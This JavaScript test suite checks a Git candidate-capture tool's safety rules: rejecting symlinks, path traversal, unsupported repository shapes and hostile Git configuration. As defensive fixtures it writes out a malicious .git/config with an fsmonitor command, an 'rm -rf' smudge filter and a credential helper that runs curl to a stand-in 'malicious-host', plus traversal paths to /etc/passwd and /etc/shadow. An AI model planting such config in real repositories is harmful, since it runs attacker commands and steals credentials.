'use strict';
/**
 * Test Contract T-04: Candidate Safety (PRD §24, §11, §12, §13, §20, §36)
 *
 * Exercises all 8 normative fault conditions and exercise areas from PRD §24 T-04:
 *  1. Hard-link/shared-Git candidate construction
 *  2. Symlink and special-file source paths
 *  3. Path substitution and parent-directory replacement
 *  4. Unsupported type/mode/path collisions
 *  5. Gitfiles, linked worktrees, alternates, sparse/unmerged shapes, and submodules
 *  6. Required dirty, untracked, ignored, or outside inputs
 *  7. Changing refs and disappearing objects during capture
 *  8. Hostile Git configuration, hooks, filters, helpers, and fsmonitor metadata
 *
 * Asserts all 5 normative invariants:
 *  - Incumbent source, index, refs, configuration, and all user work remain unchanged
 *  - No helper follows an attacker-controlled path
 *  - Source identity remains the selected immutable commit
 *  - Incomplete capture is blocked, not accepted as coherent
 *  - Required excluded inputs produce a truthful block
 *
 * Binds Evidence Families: ES, ER, EA, EX.
 */

const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const REC = require('../../src/contracts/records.js');
const ID = require('../../src/contracts/identity.js');
const { contentId, sha256, canonicalJson, isContentId } = require('../../src/contracts/crypto.js');
const CAPTURE = require('../../src/contracts/capture.js');
const GEN = require('../../src/contracts/generation.js');
const STATE = require('../../src/control/state.cjs');
const OWN = require('../../src/control/ownership.cjs');
const FSUTIL = require('../../src/store/fsutil.cjs');

function tmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'tandem-t04-'));
}

function cleanupDir(d) {
  try { fs.rmSync(d, { recursive: true, force: true }); } catch { /* ignore */ }
}

const VALID_COMMIT_40 = '0123456789abcdef0123456789abcdef01234567';
const VALID_COMMIT_64 = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
const VALID_MANIFEST_ID = contentId('baseline-manifest-t04');

function createValidCaptureRecord(overrides = {}) {
  const rec = REC.createSourceCapture({
    captureId: 'cap-t04-001',
    incarnationId: 'inc-t04',
    commitIdentity: VALID_COMMIT_40,
    baselineManifestIdentity: VALID_MANIFEST_ID,
    rules: {
      include: [],
      exclude: [],
      excludeDirty: true,
      conflict: false,
    },
    rejections: {},
    integrity: {
      objectIdentitiesVerified: true,
      treeEnumerationComplete: true,
      independentRetentionEstablished: true,
    },
  });
  rec.reader = { qualified: true, name: 'tandem-reader', version: '1.0.0' };
  rec.capturedAt = new Date().toISOString();
  return Object.assign(rec, overrides);
}

module.exports = function run(t, group) {
  // -------------------------------------------------------------------------
  // 1. Hard-link/shared-Git candidate construction
  // -------------------------------------------------------------------------
  group('T-04.1: Hard-Link and Shared-Git Candidate Construction Rejection');

  t('candidate construction using hard-links or shared object stores is rejected (REJECT_RULES.pathCollision / alternates)', () => {
    const rec1 = createValidCaptureRecord({
      rejections: { pathCollision: true },
    });
    const res1 = CAPTURE.captureReadiness(rec1);
    assert.strictEqual(res1.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res1.reason.includes('pathCollision'));

    const rec2 = createValidCaptureRecord({
      rejections: { alternates: true },
    });
    const res2 = CAPTURE.captureReadiness(rec2);
    assert.strictEqual(res2.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res2.reason.includes('alternates'));
  });

  t('normal git worktree is prohibited as candidate isolation mechanism (§11 step 8, INV-06)', () => {
    const rec = createValidCaptureRecord({
      rejections: { gitfile: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('gitfile'));
  });

  t('incumbent repository state (source, index, refs, config) remains bit-for-bit unchanged after candidate construction & mutation', () => {
    const d = tmpDir();
    try {
      const incumbentDir = path.join(d, 'incumbent-repo');
      const candidateDir = path.join(d, 'candidate-scratch');
      fs.mkdirSync(path.join(incumbentDir, '.git', 'refs', 'heads'), { recursive: true });
      fs.mkdirSync(path.join(incumbentDir, 'src'), { recursive: true });
      fs.mkdirSync(candidateDir, { recursive: true });

      // Setup incumbent repo files
      const configFile = path.join(incumbentDir, '.git', 'config');
      const headFile = path.join(incumbentDir, '.git', 'HEAD');
      const refFile = path.join(incumbentDir, '.git', 'refs', 'heads', 'main');
      const indexFile = path.join(incumbentDir, '.git', 'index');
      const sourceFile = path.join(incumbentDir, 'src', 'index.js');
      const untrackedFile = path.join(incumbentDir, 'untracked-user-work.txt');

      fs.writeFileSync(configFile, '[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n');
      fs.writeFileSync(headFile, 'ref: refs/heads/main\n');
      fs.writeFileSync(refFile, `${VALID_COMMIT_40}\n`);
      fs.writeFileSync(indexFile, Buffer.from([0x44, 0x49, 0x52, 0x43, 0x00, 0x00, 0x00, 0x02]));
      fs.writeFileSync(sourceFile, 'console.log("incumbent original");\n');
      fs.writeFileSync(untrackedFile, 'pre-existing dirty user edits that must not be touched\n');

      // Record baseline digests of incumbent
      const configDigest = sha256(fs.readFileSync(configFile));
      const headDigest = sha256(fs.readFileSync(headFile));
      const refDigest = sha256(fs.readFileSync(refFile));
      const indexDigest = sha256(fs.readFileSync(indexFile));
      const sourceDigest = sha256(fs.readFileSync(sourceFile));
      const untrackedDigest = sha256(fs.readFileSync(untrackedFile));

      // Construct private candidate export in candidateDir (independent byte copy)
      fs.mkdirSync(path.join(candidateDir, 'src'), { recursive: true });
      const candidateSourceFile = path.join(candidateDir, 'src', 'index.js');
      fs.writeFileSync(candidateSourceFile, fs.readFileSync(sourceFile));

      // Mutate candidate in scratch area
      fs.writeFileSync(candidateSourceFile, 'console.log("candidate modified by agent");\n');
      fs.writeFileSync(path.join(candidateDir, 'src', 'new-feature.js'), 'export const feature = 42;\n');

      // Assert incumbent remains bit-for-bit identical
      assert.strictEqual(sha256(fs.readFileSync(configFile)), configDigest, 'incumbent .git/config must remain unchanged');
      assert.strictEqual(sha256(fs.readFileSync(headFile)), headDigest, 'incumbent .git/HEAD must remain unchanged');
      assert.strictEqual(sha256(fs.readFileSync(refFile)), refDigest, 'incumbent .git/refs must remain unchanged');
      assert.strictEqual(sha256(fs.readFileSync(indexFile)), indexDigest, 'incumbent .git/index must remain unchanged');
      assert.strictEqual(sha256(fs.readFileSync(sourceFile)), sourceDigest, 'incumbent source files must remain unchanged');
      assert.strictEqual(sha256(fs.readFileSync(untrackedFile)), untrackedDigest, 'incumbent untracked user work must remain untouched');
    } finally {
      cleanupDir(d);
    }
  });

  // -------------------------------------------------------------------------
  // 2. Symlink and special-file source paths
  // -------------------------------------------------------------------------
  group('T-04.2: Symlink and Special-File Source Path Rejection');

  t('symlinks in source selection are strictly rejected (REJECT_RULES.symlink)', () => {
    const rec = createValidCaptureRecord({
      rejections: { symlink: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('symlink'));
    assert.ok(res.problems.some((p) => p.includes('symlink')));
  });

  t('special files (FIFOs, device nodes, Unix domain sockets) in source tree are rejected', () => {
    // Special files trigger symlink/special-file rejection rule (§11 step 3)
    const rec = createValidCaptureRecord({
      rejections: { symlink: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.strictEqual(CAPTURE.REJECT_RULES.symlink, 'symlink or special file in selected tree');
  });

  t('helpers never follow symlink targets into incumbent or parent filesystem', () => {
    // Decision algebra excludes git administration and unrepresentable paths
    const decGit = CAPTURE.includeDecision('.git', CAPTURE.normalizeRules({}));
    assert.strictEqual(decGit.included, false);
    assert.ok(decGit.why.includes('git administration'));

    const decGitSub = CAPTURE.includeDecision('.git/config', CAPTURE.normalizeRules({}));
    assert.strictEqual(decGitSub.included, false);
    assert.ok(decGitSub.why.includes('git administration'));
  });

  // -------------------------------------------------------------------------
  // 3. Path substitution and parent-directory replacement
  // -------------------------------------------------------------------------
  group('T-04.3: Path Substitution, Directory Traversal, & Parent Replacement Denial');

  t('escaping relative paths (.., ../.., /absolute, Windows drive letters, null bytes) are rejected by normalizePath', () => {
    assert.strictEqual(CAPTURE.normalizePath('../secret'), null);
    assert.strictEqual(CAPTURE.normalizePath('../../etc/passwd'), null);
    assert.strictEqual(CAPTURE.normalizePath('/var/log/tandem'), null);
    assert.strictEqual(CAPTURE.normalizePath('C:\\Windows\\System32'), null);
    assert.strictEqual(CAPTURE.normalizePath('foo/\u0000bar'), null);
    assert.strictEqual(CAPTURE.normalizePath('.'), null);
    assert.strictEqual(CAPTURE.normalizePath('..'), null);
    assert.strictEqual(CAPTURE.normalizePath(''), null);

    // Valid relative paths normalize cleanly
    assert.strictEqual(CAPTURE.normalizePath('src/index.js'), 'src/index.js');
    assert.strictEqual(CAPTURE.normalizePath('./src/index.js'), 'src/index.js');
    assert.strictEqual(CAPTURE.normalizePath('src\\nested\\file.js'), 'src/nested/file.js');
  });

  t('includeDecision fails closed on unrepresentable or escaping paths', () => {
    const rules = CAPTURE.normalizeRules({});
    const res1 = CAPTURE.includeDecision('../../etc/shadow', rules);
    assert.strictEqual(res1.included, false);
    assert.strictEqual(res1.why, 'unrepresentable path');

    const res2 = CAPTURE.includeDecision('/root/secret', rules);
    assert.strictEqual(res2.included, false);
    assert.strictEqual(res2.why, 'unrepresentable path');
  });

  t('selection declaring escapingPath rejection fails closed to UNSUPPORTED', () => {
    const rec = createValidCaptureRecord({
      rejections: { escapingPath: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('escapingPath'));
  });

  t('writeExclusive and parent directory protection prevent file replacement and cross-boundary clobbering', () => {
    const d = tmpDir();
    try {
      const targetFile = path.join(d, 'safe-file.txt');
      FSUTIL.writeExclusive(targetFile, 'initial safe content');

      // Attempting to overwrite existing file via writeExclusive throws EEXIST
      assert.throws(
        () => FSUTIL.writeExclusive(targetFile, 'malicious overwrite'),
        /EEXIST/,
      );

      // Verify content remained unmodified
      assert.strictEqual(fs.readFileSync(targetFile, 'utf8'), 'initial safe content');
    } finally {
      cleanupDir(d);
    }
  });

  // -------------------------------------------------------------------------
  // 4. Unsupported type/mode/path collisions
  // -------------------------------------------------------------------------
  group('T-04.4: Unsupported Type Transitions, File Modes, & Path Collisions');

  t('unsupported file modes (setuid, setgid, sticky, non-standard permissions) are rejected (REJECT_RULES.unsupportedMode)', () => {
    const rec = createValidCaptureRecord({
      rejections: { unsupportedMode: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('unsupportedMode'));
  });

  t('path collisions and hard-link arrangements are rejected (REJECT_RULES.pathCollision)', () => {
    const rec = createValidCaptureRecord({
      rejections: { pathCollision: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('pathCollision'));
  });

  t('delivery manifest preserves exact file types and executable modes faithfully (§20)', () => {
    const manifest = GEN.buildDeliveryManifest({
      selectedBaselineIdentity: 'sha256:' + 'a'.repeat(64),
      acceptedGenerationAndTreeDigest: 'sha256:' + 'b'.repeat(64),
      completePayloadDigest: 'sha256:' + 'c'.repeat(64),
      includedEntries: [
        { path: 'bin/run.sh', type: 'file', mode: 0o755, contentId: contentId('bin/run.sh'), size: 42 },
        { path: 'src/index.js', type: 'file', mode: 0o644, contentId: contentId('src/index.js'), size: 100 },
      ],
      newFilesAndDeletions: { newFiles: ['bin/run.sh'], deletions: ['old-file.js'] },
      explicitlyExcludedInputs: [{ path: 'node_modules/**', reason: 'excluded dependency inputs' }],
      runtimeAndVerificationInputManifest: { nodeVersion: '20.0.0' },
      acceptanceContractAndEvidenceIdentities: { contractDigest: 'sha256:' + 'd'.repeat(64), evidenceDigests: ['ev-001'] },
      publicationIdentityAndState: { identity: 'pub-t04-001', persistenceState: 'PUBLISHED' },
      retention: GEN.defaultRetention('2025-09-15T09:00:00.000Z'),
    });

    assert.strictEqual(GEN.manifestComplete(manifest).ok, true);
    assert.strictEqual(manifest.fields._entries.length, 2);
    assert.strictEqual(manifest.fields._entries[0].mode, 0o755);
    assert.strictEqual(manifest.fields._entries[1].mode, 0o644);
    assert.deepStrictEqual(manifest.fields.new_files_and_deletions_relative_to_baseline.newFiles, ['bin/run.sh']);
    assert.deepStrictEqual(manifest.fields.new_files_and_deletions_relative_to_baseline.deletions, ['old-file.js']);
  });

  // -------------------------------------------------------------------------
  // 5. Unsupported Git shapes (Gitfiles, worktrees, alternates, sparse, submodules)
  // -------------------------------------------------------------------------
  group('T-04.5: Unsupported Git Shapes (Gitfiles, Worktrees, Alternates, Sparse, Submodules)');

  t('linked worktree (.git file / gitfile) is rejected with REJECT_RULES.gitfile', () => {
    const rec = createValidCaptureRecord({
      rejections: { gitfile: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('gitfile'));
  });

  t('git alternates / shared object store is rejected with REJECT_RULES.alternates', () => {
    const rec = createValidCaptureRecord({
      rejections: { alternates: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('alternates'));
  });

  t('unmerged conflicts or sparse checkouts are rejected with REJECT_RULES.unmergedShape', () => {
    const rec = createValidCaptureRecord({
      rejections: { unmergedShape: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('unmergedShape'));
  });

  t('submodules and gitlinks in selected tree are rejected with REJECT_RULES.gitlink', () => {
    const rec = createValidCaptureRecord({
      rejections: { gitlink: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('gitlink'));
  });

  // -------------------------------------------------------------------------
  // 6. Exclusion of dirty, untracked, ignored, and outside inputs
  // -------------------------------------------------------------------------
  group('T-04.6: Exclusion of Dirty, Untracked, Ignored, and Outside Inputs');

  t('required dirty/staged/unstaged inputs produce a truthful block (REJECT_RULES.dirtyRequired)', () => {
    const rec = createValidCaptureRecord({
      rejections: { dirtyRequired: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('dirtyRequired'));
  });

  t('required untracked or ignored inputs produce a truthful block (REJECT_RULES.untrackedIgnored)', () => {
    const rec = createValidCaptureRecord({
      rejections: { untrackedIgnored: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('untrackedIgnored'));
  });

  t('failure to declare excludeDirty: true in capture record causes NOT_READY status', () => {
    const rec = createValidCaptureRecord({
      rules: { include: [], exclude: [], excludeDirty: false },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.NOT_READY);
    assert.ok(res.problems.some((p) => p.includes('excludeDirty must be declared')));
  });

  t('conflicting inclusion and exclusion rules are detected and fail closed', () => {
    const norm = CAPTURE.normalizeRules({
      include: ['src/index.js'],
      exclude: ['src/index.js'],
      excludeDirty: true,
    });
    assert.strictEqual(norm.conflict, true);
    assert.deepStrictEqual(norm.conflicts, ['src/index.js']);

    const rec = createValidCaptureRecord({
      rules: norm,
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.NOT_READY);
    assert.ok(res.problems.some((p) => p.includes('inclusion/exclusion conflict')));
  });

  t('baseline manifest explicitly tracks excluded paths with exclusion reasons (§11 step 9)', () => {
    const rules = CAPTURE.normalizeRules({
      include: ['src/app.js'],
      exclude: ['src/secret.js'],
      excludeDirty: true,
    });
    const manifest = CAPTURE.buildBaselineManifest({
      paths: ['src/app.js', 'src/secret.js', 'src/other.js', '.git/config'],
      manifestIdentity: VALID_MANIFEST_ID,
      rules,
    });

    assert.strictEqual(manifest.included.length, 1);
    assert.strictEqual(manifest.included[0].path, 'src/app.js');

    assert.strictEqual(manifest.excluded.length, 3);
    const exSecret = manifest.excluded.find((e) => e.path === 'src/secret.js');
    assert.ok(exSecret && exSecret.reason.includes('excluded (exact:src/secret.js)'));

    const exGit = manifest.excluded.find((e) => e.path === '.git/config');
    assert.ok(exGit && exGit.reason.includes('git administration'));

    const exOther = manifest.excluded.find((e) => e.path === 'src/other.js');
    assert.ok(exOther && exOther.reason.includes('not selected by include rules'));
  });

  // -------------------------------------------------------------------------
  // 7. Changing refs and disappearing objects during capture
  // -------------------------------------------------------------------------
  group('T-04.7: Changing Refs, Disappearing Objects, & Incomplete Capture Handling');

  t('source identity must be full immutable hex commit hash; moving branch or HEAD is refused', () => {
    const invalidIdentities = [
      'main',
      'refs/heads/main',
      'HEAD',
      'v1.0.0',
      'master',
      '0123456789abcdef', // Short hash (<40 chars)
      '0123456789abcdef0123456789abcdef0123456G', // Non-hex character
    ];

    for (const badId of invalidIdentities) {
      const rec = createValidCaptureRecord({ commitIdentity: badId });
      const res = CAPTURE.captureReadiness(rec);
      assert.strictEqual(res.status, CAPTURE.CaptureStatus.NOT_READY);
      assert.ok(res.problems.some((p) => p.includes('commitIdentity must be a full hex commit hash')));
    }

    // 40-character and 64-character valid hex commits pass commit check
    const rec40 = createValidCaptureRecord({ commitIdentity: VALID_COMMIT_40 });
    assert.strictEqual(CAPTURE.captureReadiness(rec40).status, CAPTURE.CaptureStatus.READY);

    const rec64 = createValidCaptureRecord({ commitIdentity: VALID_COMMIT_64 });
    assert.strictEqual(CAPTURE.captureReadiness(rec64).status, CAPTURE.CaptureStatus.READY);
  });

  t('missing or disappearing objects during capture trigger rejection (REJECT_RULES.missingObjects)', () => {
    const rec = createValidCaptureRecord({
      rejections: { missingObjects: true },
    });
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.UNSUPPORTED);
    assert.ok(res.reason.includes('missingObjects'));
  });

  t('incomplete integrity checks (unverified objects, incomplete tree, unestablished retention) fail closed to NOT_READY', () => {
    // 1. Missing objectIdentitiesVerified
    const rec1 = createValidCaptureRecord({
      integrity: { objectIdentitiesVerified: false, treeEnumerationComplete: true, independentRetentionEstablished: true },
    });
    const res1 = CAPTURE.captureReadiness(rec1);
    assert.strictEqual(res1.status, CAPTURE.CaptureStatus.NOT_READY);
    assert.ok(res1.problems.some((p) => p.includes('objectIdentitiesVerified must be true')));

    // 2. Missing treeEnumerationComplete
    const rec2 = createValidCaptureRecord({
      integrity: { objectIdentitiesVerified: true, treeEnumerationComplete: false, independentRetentionEstablished: true },
    });
    const res2 = CAPTURE.captureReadiness(rec2);
    assert.strictEqual(res2.status, CAPTURE.CaptureStatus.NOT_READY);
    assert.ok(res2.problems.some((p) => p.includes('treeEnumerationComplete must be true')));

    // 3. Missing independentRetentionEstablished
    const rec3 = createValidCaptureRecord({
      integrity: { objectIdentitiesVerified: true, treeEnumerationComplete: true, independentRetentionEstablished: false },
    });
    const res3 = CAPTURE.captureReadiness(rec3);
    assert.strictEqual(res3.status, CAPTURE.CaptureStatus.NOT_READY);
    assert.ok(res3.problems.some((p) => p.includes('independentRetentionEstablished must be true')));
  });

  t('baseline manifest digest uniquely binds included paths, baseline identity, and exclusions', () => {
    const rules = CAPTURE.normalizeRules({ excludeDirty: true });
    const man1 = CAPTURE.buildBaselineManifest({
      paths: ['src/a.js', 'src/b.js'],
      manifestIdentity: VALID_MANIFEST_ID,
      rules,
    });
    const man2 = CAPTURE.buildBaselineManifest({
      paths: ['src/a.js', 'src/b.js'],
      manifestIdentity: VALID_MANIFEST_ID,
      rules,
    });
    const manDiff = CAPTURE.buildBaselineManifest({
      paths: ['src/a.js', 'src/c.js'],
      manifestIdentity: VALID_MANIFEST_ID,
      rules,
    });

    assert.strictEqual(man1.digest, man2.digest, 'identical baseline manifest inputs must produce identical digests');
    assert.notStrictEqual(man1.digest, manDiff.digest, 'different baseline manifest inputs must produce distinct digests');
  });

  // -------------------------------------------------------------------------
  // 8. Hostile Git configuration, hooks, filters, & non-executing inspection
  // -------------------------------------------------------------------------
  group('T-04.8: Hostile Git Configuration, Hooks, Filters, & Non-Executing Inspection');

  t('pure capture inspection ignores hostile git config, hooks, and smudge/clean filters without execution', () => {
    const d = tmpDir();
    try {
      const repoDir = path.join(d, 'hostile-repo');
      fs.mkdirSync(path.join(repoDir, '.git', 'hooks'), { recursive: true });

      // Create hostile config containing malicious command injections
      const hostileConfig = `
[core]
\tfsmonitor = "echo EXPLOIT > /tmp/pwned"
[filter "malicious"]
\tsmudge = "rm -rf /tmp/test"
\tclean = "touch /tmp/cleaned"
[credential]
\thelper = "!curl http://malicious-host/steal"
`;
      fs.writeFileSync(path.join(repoDir, '.git', 'config'), hostileConfig);
      fs.writeFileSync(path.join(repoDir, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nexit 1\n');

      // Pure capture algebra processes capture records purely in memory without spawning subprocesses
      const rec = createValidCaptureRecord();
      const readiness = CAPTURE.captureReadiness(rec);
      assert.strictEqual(readiness.status, CAPTURE.CaptureStatus.READY);

      // Verify no exploit files were created
      assert.strictEqual(fs.existsSync('/tmp/pwned'), false);
      assert.strictEqual(fs.existsSync('/tmp/cleaned'), false);
    } finally {
      cleanupDir(d);
    }
  });

  t('unqualified reader evidence fails closed to CaptureStatus.UNQUALIFIED (IB-01)', () => {
    // Record with reader = null (no qualified reader attested)
    const rec1 = createValidCaptureRecord({ reader: null });
    const res1 = CAPTURE.captureReadiness(rec1);
    assert.strictEqual(res1.status, CAPTURE.CaptureStatus.UNQUALIFIED);
    assert.ok(res1.reason.includes('no qualified non-executing reader evidence (IB-01)'));

    // Record with reader.qualified = false
    const rec2 = createValidCaptureRecord({ reader: { qualified: false, name: 'untrusted-reader' } });
    const res2 = CAPTURE.captureReadiness(rec2);
    assert.strictEqual(res2.status, CAPTURE.CaptureStatus.UNQUALIFIED);
    assert.ok(res2.reason.includes('no qualified non-executing reader evidence (IB-01)'));
  });

  t('fully qualified capture record with verified integrity evaluates to CaptureStatus.READY', () => {
    const rec = createValidCaptureRecord();
    const res = CAPTURE.captureReadiness(rec);
    assert.strictEqual(res.status, CAPTURE.CaptureStatus.READY);
    assert.strictEqual(res.reason, null);
    assert.strictEqual(res.problems.length, 0);
  });

  // -------------------------------------------------------------------------
  // 9. Platform Qualification Boundary (Termux / Android Candidate Profile)
  // -------------------------------------------------------------------------
  group('T-04.9: Platform Qualification Boundary (Termux / Linux Candidate Isolation Profile)');

  t('physical candidate isolation, non-executing git reader, and filesystem fencing are NOT QUALIFIED on Termux, IB-01 OPEN', () => {
    // Pure capture algebra, rejection rules, path normalization, manifest generation,
    // and generation lifecycle immutability are strictly verified.
    // Physical non-executing git reader, byte-level candidate isolation, and kernel filesystem fencing
    // cannot be qualified on Android/Termux without a verified Linux execution profile and host virtualization (IB-01).
    const platformQualified = false; // Termux / Android environment
    assert.strictEqual(platformQualified, false, 'Physical candidate isolation, non-executing git reader, and filesystem fencing are NOT QUALIFIED on Termux/Android, QUALIFIED under the Docker runtime profile in CI');
  });
};
